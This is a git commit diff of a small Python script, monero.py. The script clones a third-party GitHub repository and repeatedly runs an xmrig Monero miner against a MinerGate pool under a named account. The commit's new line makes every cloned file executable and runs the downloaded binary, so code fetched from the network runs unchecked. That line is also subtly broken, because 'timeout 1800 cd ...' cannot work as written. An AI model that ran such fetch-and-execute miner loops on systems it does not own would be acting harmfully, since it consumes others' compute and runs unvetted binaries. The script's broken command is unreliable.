2fca3026bd398b3ab389fb52acd9e459c21a448a
Arco <49058858+arcofb@users.noreply.github.com>
2020-09-03 19:30:42 +0700

    Update monero.py

--- monero.py
+++ monero.py
@@ -7,6 +7,6 @@ os.system('git clone https://github.com/quincyhays/bmxmrig')
 sleep(2)
 while(True):
 	os.system('clear')
-	os.system('timeout 1800 ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
+	os.system('timeout 1800 cd bmxmrig && chmod +x * && ./xmrig -o xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
 	print("Please wait ...")
 	sleep(600)
